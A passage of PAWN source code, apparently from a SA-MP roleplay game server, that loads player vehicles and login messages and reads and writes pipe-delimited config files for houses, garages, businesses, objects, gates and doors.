	Player[playerid][pVVVehMod][1] = dini_Int(file, "vVVModSlot1");
	Player[playerid][pVVVehMod][2] = dini_Int(file, "vVVModSlot2");
	Player[playerid][pVVVehMod][3] = dini_Int(file, "vVVModSlot3");
	Player[playerid][pVVVehMod][4] = dini_Int(file, "vVVModSlot4");
	Player[playerid][pVVVehMod][5] = dini_Int(file, "vVVModSlot5");
	Player[playerid][pVVVehMod][6] = dini_Int(file, "vVVModSlot6");
	Player[playerid][pVVVehMod][7] = dini_Int(file, "vVVModSlot7");
	Player[playerid][pVVVehMod][8] = dini_Int(file, "vVVModSlot8");
	Player[playerid][pVVVehMod][9] = dini_Int(file, "vVVModSlot9");
	Player[playerid][pVVVehMod][10] = dini_Int(file, "vVVModSlot10");
	Player[playerid][pVVVehMod][11] = dini_Int(file, "vVVModSlot11");
	Player[playerid][pVVVehMod][12] = dini_Int(file, "vVVModSlot12");
	Player[playerid][pVVVehMod][13] = dini_Int(file, "vVVModSlot13");
	// Fourth Car
	Player[playerid][vVVVModel] = dini_Int(file, "vVVVModel");
	Player[playerid][vVVVX] = dini_Float(file, "vVVVX");
	Player[playerid][vVVVY] = dini_Float(file, "vVVVY");
	Player[playerid][vVVVZ] = dini_Float(file, "vVVVZ");
	Player[playerid][vVVVA] = dini_Float(file, "vVVVA");
	Player[playerid][vVVVC1] = dini_Int(file, "vVVVC1");
	Player[playerid][vVVVC2] = dini_Int(file, "vVVVC2");
	Player[playerid][vVVVPJ] = dini_Int(file, "vVVVPJ");
	Player[playerid][vVVVLocked] = dini_Int(file, "vVVVLocked");
	Player[playerid][pVVVVehMod][0] = dini_Int(file, "vVVVModSlot0");
	Player[playerid][pVVVVehMod][1] = dini_Int(file, "vVVVModSlot1");
	Player[playerid][pVVVVehMod][2] = dini_Int(file, "vVVVModSlot2");
	Player[playerid][pVVVVehMod][3] = dini_Int(file, "vVVVModSlot3");
	Player[playerid][pVVVVehMod][4] = dini_Int(file, "vVVVModSlot4");
	Player[playerid][pVVVVehMod][5] = dini_Int(file, "vVVVModSlot5");
	Player[playerid][pVVVVehMod][6] = dini_Int(file, "vVVVModSlot6");
	Player[playerid][pVVVVehMod][7] = dini_Int(file, "vVVVModSlot7");
	Player[playerid][pVVVVehMod][8] = dini_Int(file, "vVVVModSlot8");
	Player[playerid][pVVVVehMod][9] = dini_Int(file, "vVVVModSlot9");
	Player[playerid][pVVVVehMod][10] = dini_Int(file, "vVVVModSlot10");
	Player[playerid][pVVVVehMod][11] = dini_Int(file, "vVVVModSlot11");
	Player[playerid][pVVVVehMod][12] = dini_Int(file, "vVVVModSlot12");
	Player[playerid][pVVVVehMod][13] = dini_Int(file, "vVVVModSlot13");
	// Upgrade Points
	Player[playerid][pUpgradePoints] = dini_Int(file, "UpgradePoints");
	Player[playerid][pArmorUpgrade] = dini_Int(file, "ArmorUpgrade");
	Player[playerid][pHealthUpgrade] = dini_Int(file, "HealthUpgrade");
	// Gates
	Player[playerid][pGate][0] = dini_Int(file, "Gate1");
	Player[playerid][pGate][1] = dini_Int(file, "Gate2");
	Player[playerid][pGate][2] = dini_Int(file, "Gate3");
	// Special Tag
	format(Player[playerid][pTag], 32, "%s", dini_Get(file, "Tag"));
	// Special Name
	format(Player[playerid][pSName], 32, "%s", dini_Get(file, "SName"));
	// Special Weapon
    Player[playerid][pSpecialWeapon] = dini_Int(file, "SpecialWeapon");
	if(Player[playerid][vModel])
	{
	    Player[playerid][pVeh] = CreateVehicle(Player[playerid][vModel], Player[playerid][vX],Player[playerid][vY],Player[playerid][vZ],Player[playerid][vA],Player[playerid][vC1],Player[playerid][vC2],1200);
        ChangeVehiclePaintjob(Player[playerid][pVeh], Player[playerid][vPJ]);
        if(Player[playerid][vLocked]) SetVehicleParamsEx(Player[playerid][pVeh], 0, 0, 0, 1, 0, 0, 0);
        for(new i=0; i<14; i++)
		{
		    AddVehicleComponent(Player[playerid][pVeh], Player[playerid][pVehMod][i]);
		}
	}
	if(Player[playerid][vVModel])
	{
        //DestroyVehicle(Player[playerid][pVVeh]);
	    Player[playerid][pVVeh] = CreateVehicle(Player[playerid][vVModel], Player[playerid][vVX],Player[playerid][vVY],Player[playerid][vVZ],Player[playerid][vVA],Player[playerid][vVC1],Player[playerid][vVC2],1200);
	    //Player[playerid][pVVeh] = SetVehicleToRespawn(Player[playerid][vVModel]);
	    //vehicle2timer = SetTimerEx("car2",5000,true,"i",playerid);
        ChangeVehiclePaintjob(Player[playerid][pVVeh], Player[playerid][vVPJ]);
        if(Player[playerid][vVLocked]) SetVehicleParamsEx(Player[playerid][pVVeh], 0, 0, 0, 1, 0, 0, 0);
        for(new i=0; i<14; i++)
		{
		    AddVehicleComponent(Player[playerid][pVVeh], Player[playerid][pVVehMod][i]);
		}
	}
	if(Player[playerid][vVVModel])
	{
        //DestroyVehicle(Player[playerid][pVVVeh]);
	    Player[playerid][pVVVeh] =  CreateVehicle(Player[playerid][vVVModel], Player[playerid][vVVX],Player[playerid][vVVY],Player[playerid][vVVZ],Player[playerid][vVVA],Player[playerid][vVVC1],Player[playerid][vVVC2],1200);
	    //Player[playerid][pVVVeh] = SetVehicleToRespawn(Player[playerid][vVVModel]);
	    //vehicle3timer = SetTimerEx("car3",5000,true,"i",playerid);
        ChangeVehiclePaintjob(Player[playerid][pVVVeh], Player[playerid][vVVPJ]);
        if(Player[playerid][vVVLocked]) SetVehicleParamsEx(Player[playerid][pVVVeh], 0, 0, 0, 1, 0, 0, 0);
        for(new i=0; i<14; i++)
		{
		    AddVehicleComponent(Player[playerid][pVVVeh], Player[playerid][pVVVehMod][i]);
		}
	}
	if(Player[playerid][vVVVModel])
	{
        //DestroyVehicle(Player[playerid][pVVVVeh]);
	    Player[playerid][pVVVVeh] =  CreateVehicle(Player[playerid][vVVVModel], Player[playerid][vVVVX],Player[playerid][vVVVY],Player[playerid][vVVVZ],Player[playerid][vVVVA],Player[playerid][vVVVC1],Player[playerid][vVVVC2],1200);
	    //vehicle4timer = SetTimerEx("car4",5000,true,"i",playerid);
        ChangeVehiclePaintjob(Player[playerid][pVVVVeh], Player[playerid][vVVVPJ]);
        if(Player[playerid][vVVVLocked]) SetVehicleParamsEx(Player[playerid][pVVVVeh], 0, 0, 0, 1, 0, 0, 0);
        for(new i=0; i<14; i++)
		{
		    AddVehicleComponent(Player[playerid][pVVVVeh], Player[playerid][pVVVVehMod][i]);
		}
	}
	LoadToys(playerid, file);
	// All Loaded
	print("Character file loaded successfuly.");
	new string[256];
	// Player
	format(string, sizeof(string), "* Welcome to International Roleplay %s, Your last login was from %s.", GetName(playerid), Player[playerid][pIP]);
    SendClientMessage(playerid, COLOR_WHITE, string);
    // Helper Messages
    if(Player[playerid][pHelper])
	{
        format(string, sizeof(string), "HelperLogin: %s %s has logged in.", RPHLN(playerid), GetName(playerid));
        SendHelperMessage(COLOR_ADMWARN, string);
	}
	if(Player[playerid][pStaffObserver])
	{
        format(string, sizeof(string), "StaffLogin: %s %s has logged in.", RPMODLN(playerid), GetName(playerid));
        StaffWarn(COLOR_SWARN, string);
	}
   /* foreach(Player, i)
	{
	    if(Logged(i))
	    {
	      if(Player[playerid][pAdmin] == 2) ShowPlayerNameTagForPlayer(i, playerid, false);
          if(Player[playerid][pAdmin] == 3) ShowPlayerNameTagForPlayer(i, playerid, false);
          if(Player[playerid][pAdmin] == 4) ShowPlayerNameTagForPlayer(i, playerid, false);
	      if(Player[playerid][pAdmin] == 1337) ShowPlayerNameTagForPlayer(i, playerid, false);
	      if(Player[playerid][pAdmin] == 1338) ShowPlayerNameTagForPlayer(i, playerid, false);
	      if(Player[playerid][pAdmin] == 100000) ShowPlayerNameTagForPlayer(i, playerid, false);
	   }
    }
	if(IsValidDynamic3DTextLabel(aAdminText[playerid])) DestroyDynamic3DTextLabel(aAdminText[playerid]);
	if(Player[playerid][pAdmin] == 2) aAdminText[playerid] = CreateDynamic3DTextLabel(string, COLOR_LIME, 0, 0, -24, 29, playerid);
    if(Player[playerid][pAdmin] == 3) aAdminText[playerid] = CreateDynamic3DTextLabel(string, COLOR_YELLOW, 0, 0, -24, 29, playerid);
    if(Player[playerid][pAdmin] == 4) aAdminText[playerid] = CreateDynamic3DTextLabel(string, COLOR_ORANGE, 0, 0, -24, 29, playerid);
    if(Player[playerid][pAdmin] == 1337) aAdminText[playerid] = CreateDynamic3DTextLabel(string, COLOR_DARKRED, 0, 0, -24, 29, playerid);
    if(Player[playerid][pAdmin] == 1338) aAdminText[playerid] = CreateDynamic3DTextLabel(string, COLOR_RED, 0, 0, -24, 29, playerid);
    if(Player[playerid][pAdmin] == 100000) aAdminText[playerid] = CreateDynamic3DTextLabel(string, COLOR_RED, 0, 0, -24, 29, playerid);
	fa(STREAMER_TYPE_3D_TEXT_LABEL, aAdminText[playerid] , E_STREAMER_ATTACH_OFFSET_Z, 0.29);*/
    if(Player[playerid][pAdmin])
	{
    	format(string, sizeof(string), "AdminLogin: %s %s has logged in.", RPALN(playerid), GetName(playerid));
        SendAdminMessage(COLOR_ADMWARN,  string);
        format(string, sizeof(string), "Admin Motd: %s", ADMINMOTD);
        SendClientMessage(playerid, COLOR_ADMWARN,  string);
	}
	if(Player[playerid][pAdminLocked])
	{
    	format(string, sizeof(string), "AdminWarning: Your account is locked by an administrator.");
        SendClientMessage(playerid, COLOR_ADMWARN,  string);
        Kick(playerid);

	}
    // Families & Factions MOTDs
    if(strlen(FamInfo[Player[playerid][pFam]][fMOTD]) > 0)
	{
    	format(string, sizeof(string), "FAMILY MOTD: %s", FamInfo[Player[playerid][pFam]][fMOTD]);
        SendClientMessage(playerid, COLOR_YELLOW, string);
	}
	return 1;
}

enum jobInfo
{
	jCars[9],
	jTrailers[9]
}
new JobInfo[MAX_JOBS][jobInfo];


// House Settings
enum houseInfo
{
	hLevel,
	hPrice,
	hStatus,
	hOwner[32],
	Float:hX,
	Float:hY,
	Float:hZ,
	hMoney,
	hMaterials,
	hSeed,
	hcocaine,
	hsafe,
	hWeed,
	hGun[5],
	hGunAmmo[5],
	hPickup,
	Text3D:hText
}
new HouseInfo[MAX_HOUSES][houseInfo];

stock LoadHouses()
{
	new binfo[23][32];
	new string[256];
	new File:file = fopen("houses.cfg", io_read);
	if(file)
	{
	    new idx = 1;
		while(idx < MAX_HOUSES)
		{
		    fread(file, string);
		    split(string, binfo, '|');
		    HouseInfo[idx][hLevel] = strval(binfo[0]);
		    HouseInfo[idx][hPrice] = strval(binfo[1]);
		    HouseInfo[idx][hStatus] = strval(binfo[2]);
		    format(HouseInfo[idx][hOwner], 32, "%s", binfo[3]);
		    HouseInfo[idx][hX] = floatstr(binfo[4]);
		    HouseInfo[idx][hY] = floatstr(binfo[5]);
		    HouseInfo[idx][hZ] = floatstr(binfo[6]);
		    HouseInfo[idx][hMoney] = strval(binfo[7]);
		    HouseInfo[idx][hMaterials] = strval(binfo[8]);
		    HouseInfo[idx][hWeed] = strval(binfo[9]);
		    HouseInfo[idx][hcocaine] = strval(binfo[10]);
		    HouseInfo[idx][hSeed] = strval(binfo[11]);
			HouseInfo[idx][hGun][0] = strval(binfo[12]);
			HouseInfo[idx][hGunAmmo][0] = strval(binfo[13]);
			HouseInfo[idx][hGun][1] = strval(binfo[14]);
			HouseInfo[idx][hGunAmmo][1] = strval(binfo[15]);
			HouseInfo[idx][hGun][2] = strval(binfo[16]);
			HouseInfo[idx][hGunAmmo][2] = strval(binfo[17]);
			HouseInfo[idx][hGun][3] = strval(binfo[18]);
			HouseInfo[idx][hGunAmmo][3] = strval(binfo[19]);
			HouseInfo[idx][hGun][4] = strval(binfo[20]);
			HouseInfo[idx][hGunAmmo][4] = strval(binfo[21]);
			HouseInfo[idx][hsafe] = strval(binfo[22]);
			if(HouseInfo[idx][hLevel])
			{
			    HouseInfo[idx][hPickup] = CreateDynamicPickup(1273, 1, HouseInfo[idx][hX], HouseInfo[idx][hY], HouseInfo[idx][hZ], 0);
                if(!strcmp("The State", HouseInfo[idx][hOwner])) format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: For Sale\nHouse Price:$%d", HouseInfo[idx][hOwner], HT(idx), HouseInfo[idx][hPrice]);
				else format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: %s", HouseInfo[idx][hOwner], HT(idx), RHS(idx));
				HouseInfo[idx][hText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, HouseInfo[idx][hX], HouseInfo[idx][hY], HouseInfo[idx][hZ]+0.5, 15);

			}
			idx++;
	    }
	}
	print("Houses loaded successfully.");
	return 1;
}

stock SaveHouses()
{
	new idx = 1, File:file;
	new string[256];
	while(idx < MAX_HOUSES)
	{
	    format(string, sizeof(string), "%d|%d|%d|%s|%f|%f|%f|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d\r\n",
	    HouseInfo[idx][hLevel],
	    HouseInfo[idx][hPrice],
	    HouseInfo[idx][hStatus],
	    HouseInfo[idx][hOwner],
	    HouseInfo[idx][hX],
	    HouseInfo[idx][hY],
	    HouseInfo[idx][hZ],
	    HouseInfo[idx][hMoney],
	    HouseInfo[idx][hMaterials],
	    HouseInfo[idx][hWeed],
	    HouseInfo[idx][hcocaine],
	    HouseInfo[idx][hSeed],
		HouseInfo[idx][hGun][0],
		HouseInfo[idx][hGunAmmo][0],
		HouseInfo[idx][hGun][1],
		HouseInfo[idx][hGunAmmo][1],
		HouseInfo[idx][hGun][2],
		HouseInfo[idx][hGunAmmo][2],
		HouseInfo[idx][hGun][3],
		HouseInfo[idx][hGunAmmo][3],
		HouseInfo[idx][hGun][4],
		HouseInfo[idx][hGunAmmo][4],
		HouseInfo[idx][hsafe]
		);
	    if(idx == 1)
	    {
	        file = fopen("houses.cfg", io_write);
	    }
	    else
	    {
	    	file = fopen("houses.cfg", io_append);
	    }
		fwrite(file, string);
		fclose(file);
		idx++;
	}
	print("Houses saved successfully.");
}
//Garage Settings
enum garageInfo
{
	gLevel,
	gPrice,
	gStatus,
	gOwner[32],
	Float:gX,
	Float:gY,
	Float:gZ,
	gPickup,
	Text3D:gText
}
new GarageInfo[MAX_GARAGES][garageInfo];

stock LoadGarages()
{
	new binfo[21][32];
	new string[256];
	new File:file = fopen("garages.cfg", io_read);
	if(file)
	{
	    new idx = 1;
		while(idx < MAX_GARAGES)
		{
		    fread(file, string);
		    split(string, binfo, '|');
		    GarageInfo[idx][gLevel] = strval(binfo[0]);
		    GarageInfo[idx][gPrice] = strval(binfo[1]);
		    GarageInfo[idx][gStatus] = strval(binfo[2]);
		    format(GarageInfo[idx][gOwner], 32, "%s", binfo[3]);
		    GarageInfo[idx][gX] = floatstr(binfo[4]);
		    GarageInfo[idx][gY] = floatstr(binfo[5]);
		    GarageInfo[idx][gZ] = floatstr(binfo[6]);
			if(GarageInfo[idx][gLevel])
			{
			    GarageInfo[idx][gPickup] = CreateDynamicPickup(1318, 1, GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ], 0);
                if(!strcmp("The State", GarageInfo[idx][gOwner])) format(string, sizeof(string), "Garage Size: %s\nStatus: For Sale\nPrice: $%d", GT(idx), GarageInfo[idx][gPrice]);
				else format(string, sizeof(string), "Garage of %s\nGarage Size: %s\n%s", GarageInfo[idx][gOwner], GT(idx), GTT(idx));
				GarageInfo[idx][gText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ]+0.3, 15);

			}
			idx++;
	    }
	}
	print("Garages loaded successfully.");
	return 1;
}

stock SaveGarages()
{
	new idx = 1, File:file;
	new string[256];
	while(idx < MAX_GARAGES)
	{
	    format(string, sizeof(string), "%d|%d|%d|%s|%f|%f|%f\r\n",
	    GarageInfo[idx][gLevel],
	    GarageInfo[idx][gPrice],
	    GarageInfo[idx][gStatus],
	    GarageInfo[idx][gOwner],
	    GarageInfo[idx][gX],
	    GarageInfo[idx][gY],
	    GarageInfo[idx][gZ]);
	    if(idx == 1)
	    {
	        file = fopen("garages.cfg", io_write);
	    }
	    else
	    {
	    	file = fopen("garages.cfg", io_append);
	    }
		fwrite(file, string);
		fclose(file);
		idx++;
	}
	print("Garages saved successfully.");
}
// Business Settings
enum bizInfo
{
	bType,
	bStatus,
	bOwner[32],
	Float:bX,
	Float:bY,
	Float:bZ,
	bPickup,
	bMoney,
	bProducts,
	Text3D:bText,
	bSold,
	bLevel,
	bPrice,
	bAP,
	bCellphone,
	bPhonebook,
	bDice,
	bCigar,
	bSprunk,
	bSpraycan,
	bRope,
	bMask,
	bBlindfold,
	bWalkietalkie,
	bMP3,
	bCamera,
	bGascan,
	bBoombox,
	bSpeedo,
	bMessage[128]


}
new BizInfo[MAX_BIZ][bizInfo];

stock LoadBusiness()
{
    if(!fexist("business.cfg")) fcreate("business.cfg");
	new binfo[28][32];
	new string[256];
	new File:file = fopen("business.cfg", io_read);
	if(file)
	{
	    new idx = 1;
		while(idx < MAX_BIZ)
		{
		    fread(file, string);
		    split(string, binfo, '|');
		    BizInfo[idx][bType] = strval(binfo[0]);
		    BizInfo[idx][bStatus] = strval(binfo[1]);
		    format(BizInfo[idx][bOwner], 32, "%s", binfo[2]);
		    BizInfo[idx][bX] = floatstr(binfo[3]);
		    BizInfo[idx][bY] = floatstr(binfo[4]);
		    BizInfo[idx][bZ] = floatstr(binfo[5]);
		    BizInfo[idx][bMoney] = strval(binfo[6]);
		    BizInfo[idx][bProducts] = strval(binfo[7]);
		    BizInfo[idx][bSold] = strval(binfo[8]);
		    BizInfo[idx][bLevel] = strval(binfo[9]);
		    BizInfo[idx][bPrice] = strval(binfo[10]);
		    BizInfo[idx][bAP] = strval(binfo[11]);
		    BizInfo[idx][bCellphone] = strval(binfo[12]);
		    BizInfo[idx][bPhonebook] = strval(binfo[13]);
		    BizInfo[idx][bDice] = strval(binfo[14]);
		    BizInfo[idx][bCigar] = strval(binfo[15]);
		    BizInfo[idx][bSprunk] = strval(binfo[16]);
		    BizInfo[idx][bSpraycan] = strval(binfo[17]);
		    BizInfo[idx][bRope] = strval(binfo[18]);
		    BizInfo[idx][bMask] = strval(binfo[19]);
		    BizInfo[idx][bBlindfold] = strval(binfo[20]);
		    BizInfo[idx][bWalkietalkie] = strval(binfo[21]);
		    BizInfo[idx][bMP3] = strval(binfo[22]);
		    BizInfo[idx][bCamera] = strval(binfo[23]);
		    BizInfo[idx][bGascan] = strval(binfo[24]);
		    BizInfo[idx][bBoombox] = strval(binfo[25]);
		    BizInfo[idx][bSpeedo] = strval(binfo[26]);
		    format(BizInfo[idx][bMessage], 128, "%s", binfo[27]);
		    if(BizInfo[idx][bType]) // If Business is owned
		    {
		    	BizInfo[idx][bPickup] = CreateDynamicPickup(1272, 1, BizInfo[idx][bX], BizInfo[idx][bY], BizInfo[idx][bZ], 0);
		    	if(!strcmp("The State", BizInfo[idx][bOwner])) format(string, sizeof(string), "Business Type: %s\nBusiness Owner: %s\nBusiness Status: For Sale\nBusiness Price: $%d", RBT(idx), BizInfo[idx][bOwner], BizInfo[idx][bPrice]);
				else format(string, sizeof(string), "Business Type: %s\nBusiness Owner: %s\nBusiness Status: %s", RBT(idx), BizInfo[idx][bOwner], RBS(idx));
		    	BizInfo[idx][bText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, BizInfo[idx][bX], BizInfo[idx][bY], BizInfo[idx][bZ]+0.5, 15);
			}
			idx++;
	    }
	}
	print("Businesses loaded successfully.");
	return 1;
}

stock SaveBusiness()
{
    if(!fexist("business.cfg")) fcreate("business.cfg");
	new idx = 1, File:file;
	new string[256];
	while(idx < MAX_BIZ)
	{
        format(string, sizeof(string), "%d|%d|%s|%f|%f|%f|%d|%d|%d|%d|%d|%d|%s\r\n", BizInfo[idx][bType], BizInfo[idx][bStatus], BizInfo[idx][bOwner], BizInfo[idx][bX], BizInfo[idx][bY], BizInfo[idx][bZ], BizInfo[idx][bMoney], BizInfo[idx][bProducts], BizInfo[idx][bSold], BizInfo[idx][bLevel], BizInfo[idx][bPrice], BizInfo[idx][bAP], BizInfo[idx][bMessage]);
	    if(idx == 1)
	    {
	        file = fopen("business.cfg", io_write);
	    }
	    else
	    {
	    	file = fopen("business.cfg", io_append);
	    }
		fwrite(file, string);
		fclose(file);
		idx++;
	}
	print("Businesses saved successfully.");
}
/*stock SaveBusiness()
{
    if(!fexist("business.cfg")) fcreate("business.cfg");
	new idx = 1, File:file;
	new string[128], string1[256];
	while(idx < MAX_BIZ)
	{
        format(string1, sizeof(string1), "%d|%d|%s|%f|%f|%f|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|", BizInfo[idx][bType], BizInfo[idx][bStatus], BizInfo[idx][bOwner], BizInfo[idx][bX], BizInfo[idx][bY], BizInfo[idx][bZ], BizInfo[idx][bMoney], BizInfo[idx][bProducts], BizInfo[idx][bSold], BizInfo[idx][bLevel], BizInfo[idx][bPrice], BizInfo[idx][bAP], BizInfo[idx][bCellphone], BizInfo[idx][bPhonebook], BizInfo[idx][bDice], BizInfo[idx][bCigar], BizInfo[idx][bSprunk], BizInfo[idx][bSpraycan]);
        strcat(string, string1, sizeof(string1);
        format(string1, sizeof(string1), "%d|%d|%d|%d|%d|%d|%d|%d|%d|%s\r\n", BizInfo[idx][bRope], BizInfo[idx][bMask], BizInfo[idx][bBlindfold], BizInfo[idx][bWalkietalkie], BizInfo[idx][bMP3], BizInfo[idx][bCamera], BizInfo[idx][bGascan], BizInfo[idx][bBoombox], BizInfo[idx][bSpeedo], BizInfo[idx][bMessage]);
        strcat(string, string1, sizeof(string1);
	    if(idx == 1)
	    {
	        file = fopen("business.cfg", io_write);
	    }
	    else
	    {
	    	file = fopen("business.cfg", io_append);
	    }
		fwrite(file, string);
		fclose(file);
		idx++;
	}
	print("Businesses saved successfully.");
}*/

enum objInfo
{
	obj,
	Text3D:oText,
	oModel,
	Float:oX,
	Float:oY,
	Float:oZ,
	Float:oRX,
	Float:oRY,
	Float:oRZ,
}
new ObjectInfo[MAX_COBJECTS][objInfo];

stock LoadObj()
{
	new dinfo[15][128];
	new string[256];
	new File:file = fopen("crobjects.cfg", io_read);
	if(file)
	{
	    new idx = 1;
		while(idx < MAX_COBJECTS)
		{
		    fread(file, string);
		    split(string, dinfo, '|');
			ObjectInfo[idx][oModel] = strval(dinfo[0]);
			ObjectInfo[idx][oX] = floatstr(dinfo[1]);
			ObjectInfo[idx][oY] = floatstr(dinfo[2]);
			ObjectInfo[idx][oZ] = floatstr(dinfo[3]);
			ObjectInfo[idx][oRX] = floatstr(dinfo[4]);
			ObjectInfo[idx][oRY] = floatstr(dinfo[5]);
			ObjectInfo[idx][oRZ] = floatstr(dinfo[6]);
			if(ObjectInfo[idx][oModel]) // If gate exists
			{
				ObjectInfo[idx][obj] = CreateDynamicObject(ObjectInfo[idx][oModel], ObjectInfo[idx][oX], ObjectInfo[idx][oY], ObjectInfo[idx][oZ], ObjectInfo[idx][oRX], ObjectInfo[idx][oRY], ObjectInfo[idx][oRZ]);
				//O-bjectInfo[idx][oText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, ObjectInfo[idx][oX], ObjectInfo[idx][oY], ObjectInfo[idx][oZ], 10);
			}
			idx++;
	    }
	}
	print("Objects loaded successfully.");
	return 1;
}

stock SaveObj()
{
	new idx = 1, File:file;
	new string[256];
	while(idx < MAX_COBJECTS)
	{
	    format(string, sizeof(string), "%d|%f|%f|%f|%f|%f|%f\r\n",
        ObjectInfo[idx][oModel],
        ObjectInfo[idx][oX],
        ObjectInfo[idx][oY],
        ObjectInfo[idx][oZ],
        ObjectInfo[idx][oRX],
        ObjectInfo[idx][oRY],
        ObjectInfo[idx][oRZ]);
        if(idx == 1)
	    {
	        file = fopen("crobjects.cfg", io_write);
	    }
	    else
	    {
	    	file = fopen("crobjects.cfg", io_append);
	    }
		fwrite(file, string);
		fclose(file);
		idx++;
	}
	print("Objects saved successfully.");
	return 1;
}
enum gateInfo
{
	gGate,
	Text3D:gText,
	gModel,
	Float:gCX,
	Float:gCY,
	Float:gCZ,
	Float:gCRX,
	Float:gCRY,
	Float:gCRZ,
	Float:gOX,
	Float:gOY,
	Float:gOZ,
	Float:gORX,
	Float:gORY,
	Float:gORZ,
	gPassword[256],
	Float:gSpeed,
	gStatus
}
new GateInfo[MAX_GATES][gateInfo];

stock LoadGates()
{
	new dinfo[15][128];
	new string[256];
	new File:file = fopen("gates.cfg", io_read);
	if(file)
	{
	    new idx = 1;
		while(idx < MAX_GATES)
		{
		    fread(file, string);
		    split(string, dinfo, '|');
			GateInfo[idx][gModel] = strval(dinfo[0]);
			GateInfo[idx][gCX] = floatstr(dinfo[1]);
			GateInfo[idx][gCY] = floatstr(dinfo[2]);
			GateInfo[idx][gCZ] = floatstr(dinfo[3]);
			GateInfo[idx][gCRX] = floatstr(dinfo[4]);
			GateInfo[idx][gCRY] = floatstr(dinfo[5]);
			GateInfo[idx][gCRZ] = floatstr(dinfo[6]);
			GateInfo[idx][gOX] = floatstr(dinfo[7]);
			GateInfo[idx][gOY] = floatstr(dinfo[8]);
			GateInfo[idx][gOZ] = floatstr(dinfo[9]);
			GateInfo[idx][gORX] = floatstr(dinfo[10]);
			GateInfo[idx][gORY] = floatstr(dinfo[11]);
			GateInfo[idx][gORZ] = floatstr(dinfo[12]);
			format(GateInfo[idx][gPassword], 256, "%s", dinfo[13]);
			GateInfo[idx][gSpeed] = floatstr(dinfo[14]);
			if(GateInfo[idx][gModel]) // If gate exists
			{
				GateInfo[idx][gGate] = CreateDynamicObject(GateInfo[idx][gModel], GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ], GateInfo[idx][gCRX], GateInfo[idx][gCRY], GateInfo[idx][gCRZ]);
				GateInfo[idx][gStatus] = 0;
			}
			idx++;
	    }
	}
	print("Gates loaded successfully.");
	return 1;
}

stock SaveGates()
{
	new idx = 1, File:file;
	new string[256];
	while(idx < MAX_GATES)
	{
	    format(string, sizeof(string), "%d|%f|%f|%f|%f|%f|%f|%f|%f|%f|%f|%f|%f|%s|%f\r\n",
		GateInfo[idx][gModel],
		GateInfo[idx][gCX],
		GateInfo[idx][gCY],
		GateInfo[idx][gCZ],
		GateInfo[idx][gCRX],
		GateInfo[idx][gCRY],
		GateInfo[idx][gCRZ],
		GateInfo[idx][gOX],
		GateInfo[idx][gOY],
		GateInfo[idx][gOZ],
		GateInfo[idx][gORX],
		GateInfo[idx][gORY],
		GateInfo[idx][gORZ],
		GateInfo[idx][gPassword],
		GateInfo[idx][gSpeed]);
		GateInfo[idx][gStatus] = 0;
	    if(idx == 1)
	    {
	        file = fopen("gates.cfg", io_write);
	    }
	    else
	    {
	    	file = fopen("gates.cfg", io_append);
	    }
		fwrite(file, string);
		fclose(file);
		idx++;
	}
	print("Gates saved successfully.");
	return 1;
}

enum doorInfo
{
	dPickup,
	dType,
	Float:dOX,
	Float:dOY,
	Float:dOZ,
	Float:dIX,
	Float:dIY,
	Float:dIZ,
	dOInt,
	dOVW,
	dIInt,
	dIVW,
	dCInt,
	dCExt,
	Float:dIA,
	Float:dOA,
	Text3D:dTextID,
	dText[128],

}
new DoorInfo[MAX_DOORS][doorInfo];

stock LoadDoors()
{
	new dinfo[16][128];
	new string[256];
	new File:file = fopen("doors.cfg", io_read);
	if(file)
	{
	    new idx = 0;
		while(idx < MAX_DOORS)
		{
		    fread(file, string);
		    split(string, dinfo, '|');
		    DoorInfo[idx][dType] = strval(dinfo[0]);
			DoorInfo[idx][dOX] = floatstr(dinfo[1]);
			DoorInfo[idx][dOY] = floatstr(dinfo[2]);
			DoorInfo[idx][dOZ] = floatstr(dinfo[3]);
			DoorInfo[idx][dIX] = floatstr(dinfo[4]);
			DoorInfo[idx][dIY] = floatstr(dinfo[5]);
			DoorInfo[idx][dIZ] = floatstr(dinfo[6]);
			DoorInfo[idx][dOInt] = strval(dinfo[7]);
			DoorInfo[idx][dOVW] = strval(dinfo[8]);
			DoorInfo[idx][dIInt] = strval(dinfo[9]);
			DoorInfo[idx][dIVW] = strval(dinfo[10]);
			DoorInfo[idx][dCInt] = strval(dinfo[11]);
			DoorInfo[idx][dCExt] = strval(dinfo[12]);
			DoorInfo[idx][dIA] = floatstr(dinfo[13]);
			format(DoorInfo[idx][dText], 128, "%s", dinfo[14]);
			DoorInfo[idx][dOA] = floatstr(dinfo[15]);
			if(DoorInfo[idx][dType]) // If door exists
			{
                DoorInfo[idx][dPickup] = CreateDynamicPickup(DoorInfo[idx][dType], 1, DoorInfo[idx][dOX], DoorInfo[idx][dOY], DoorInfo[idx][dOZ], DoorInfo[idx][dOVW], DoorInfo[idx][dOInt]);
				format(string, sizeof(string), "ID: %d\n%s", idx, DoorInfo[idx][dText]);
				DoorInfo[idx][dTextID] = CreateDynamic3DTextLabel(string, COLOR_WHITE, DoorInfo[idx][dOX], DoorInfo[idx][dOY], DoorInfo[idx][dOZ]+0.3, 15);
			}
			idx++;
	    }
	}
	print("Doors loaded successfully.");
	return 1;
}

stock SaveDoors()
{
	new idx = 0, File:file;
	new string[256];
	while(idx < MAX_DOORS)
	{
	    format(string, sizeof(string), "%d|%f|%f|%f|%f|%f|%f|%d|%d|%d|%d|%d|%d|%f|%s|%f\r\n",
  		DoorInfo[idx][dType],
		DoorInfo[idx][dOX],
		DoorInfo[idx][dOY],
		DoorInfo[idx][dOZ],
		DoorInfo[idx][dIX],
		DoorInfo[idx][dIY],
		DoorInfo[idx][dIZ],
		DoorInfo[idx][dOInt],
		DoorInfo[idx][dOVW],
		DoorInfo[idx][dIInt],
		DoorInfo[idx][dIVW],
		DoorInfo[idx][dCInt],
		DoorInfo[idx][dCExt],
		DoorInfo[idx][dIA],
		DoorInfo[idx][dText],
